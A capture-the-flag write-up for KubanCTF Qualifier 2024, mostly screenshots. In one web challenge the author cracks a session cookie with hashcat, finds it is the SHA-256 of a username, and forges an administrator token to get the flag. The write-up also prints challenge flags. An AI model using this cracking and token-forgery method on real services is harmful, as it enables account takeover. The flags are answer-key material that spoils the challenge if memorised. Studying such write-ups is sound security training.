# KubanCTF Qualifier 2024 Write-up

![image](https://github.com/user-attachments/assets/aadb302f-e910-4f33-ac24-ef0ba71a2355)

## Not broken

File -> export object -> HTTP

![image](https://github.com/user-attachments/assets/efd0be5b-9507-4357-ba2e-1f198689b7e1)

Save largest packet and open it

We can see that is request to image

## WEB

### WEB - Примечание

![image](https://github.com/user-attachments/assets/5e8b51ff-ed39-44d6-b7a2-1ec88044fe47)

![image](https://github.com/user-attachments/assets/4a8c3879-3f5e-45e6-b85e-bd19d882ef44)

![image](https://github.com/user-attachments/assets/759a79e2-0319-4c5c-9c88-a9e46828fede)

![image](https://github.com/user-attachments/assets/db1a1837-c470-410b-bce6-651cfc55e770)

![image](https://github.com/user-attachments/assets/d2f501ea-be2e-4a50-944c-f0dc823deba8)

Request

    GET /profile.php HTTP/1.1
    Host: 62.173.147.143:16004
    Accept: */*
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36
    X-Requested-With: XMLHttpRequest
    Referer: http://62.173.147.143:16004/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: ru-RU,ru;q=0.9
    Cookie: Token=ecd71870d1963316a97e3ac3408c9835ad8cf0f3c1bc703527c30265534f75ae
    Connection: close

Our token is `ecd71870d1963316a97e3ac3408c9835ad8cf0f3c1bc703527c30265534f75ae`

    hashcat ecd71870d1963316a97e3ac3408c9835ad8cf0f3c1bc703527c30265534f75ae
    
    hashcat -m 1400 -a 0 'ecd71870d1963316a97e3ac3408c9835ad8cf0f3c1bc703527c30265534f75ae' /home/kali/wordlist/rockyou.txt

![image](https://github.com/user-attachments/assets/03c4eca3-5f3d-4a48-815e-45ff70c44c12)

![image](https://github.com/user-attachments/assets/42c070bf-0377-4030-aee0-bbbcc73bd5ba)

   `cd71870d1963316a97e3ac3408c9835ad8cf0f3c1bc703527c30265534f75ae`:`test123`

   ![image](https://github.com/user-attachments/assets/21981efc-cd52-490e-a6f0-e40c0a05a401)

administrator@codeby.games

    echo -n 'administrator' | sha256sum 

![image](https://github.com/user-attachments/assets/62c848cc-3846-424d-981e-387d711d5d1e)

    4194d1706ed1f408d5e02d672777019f4d5385c766a8c6ca8acba3167d36a7b9

![image](https://github.com/user-attachments/assets/61fb9b8b-3909-434f-801b-f04eda3fabdb)

![image](https://github.com/user-attachments/assets/ba360d09-40dc-4633-b1e5-8732834be5ec)

FLAG:

    CSC{sup3r_w34k_co0ki3}

## WEB - What's missing?

![image](https://github.com/user-attachments/assets/8408fc1b-ceb0-4b6d-98b8-e6a56f5107db)

![image](https://github.com/user-attachments/assets/8bacbcba-8ff8-46fe-bf09-47eb96989414)

![image](https://github.com/user-attachments/assets/22bb170f-6bd7-4eb9-9ba4-9edb46924d14)

FLAG:

    CSC{7H3_L1M174710NS_4R3_0NLY_1N_0UR_H34DS}
